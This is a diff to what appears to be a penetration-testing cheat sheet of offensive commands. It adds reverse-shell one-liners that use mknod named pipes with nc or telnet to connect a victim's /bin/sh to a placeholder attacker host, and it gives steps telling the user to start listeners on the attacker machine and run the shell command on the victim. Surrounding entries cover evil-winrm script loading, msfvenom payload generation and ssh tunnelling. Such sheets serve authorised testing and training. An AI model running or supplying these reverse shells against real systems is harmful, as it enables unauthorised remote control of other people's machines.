@@ -7,6 +7,12 @@
 #### `evil-winrm -i X.X.X.X -u <username> -p -s <path/to/ps1>`
   * -s allows yoiu to load powershell scripts from Kali to the victim
 
+# [mknod](https://man7.org/linux/man-pages/man1/mknod.1.html):
+#### `mknod /tmp/backpipe p`
+#### `/bin/sh 0</tmp/backpipe | nc X.X.X.X YYY 1>/tmp/backpipe`
+#### `mknod /tmp/backpipe p && telnet X.X.X.X YYY 0</tmp/backpipe | /bin/sh 1>/tmp/backpipe`
+  * [archived](https://web.archive.org/web/20210310030514/https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
+
 # [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/):
 #### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows`
 #### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows -b "\x00\x0a\x0d"`
@@ -62,3 +68,12 @@
 #### `ssh -D YYY <username>@X.X.X.X`
   * -R binds a remote server's (X.X.X.X) port (YYY) to the local server's (A.A.A.A) port (BBB) using the remote server's credentials
   * -D specifies a local dynamic application-level port forwarder for tunneling
+
+# [telnet](https://linux.die.net/man/1/telnet):
+#### `nc -nlvp YYY`
+#### `nc -nlvp ZZZ`
+#### `telnet X.X.X.X YYY | /bin/sh | telnet X.X.X.X ZZZ`
+  * [archived](https://web.archive.org/web/20210310030514/https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
+  * Run the top two commands on the attacker machine, then the bottom command on the victim
+  * Type commands into the first shell window, then read the output from the second shell window
+
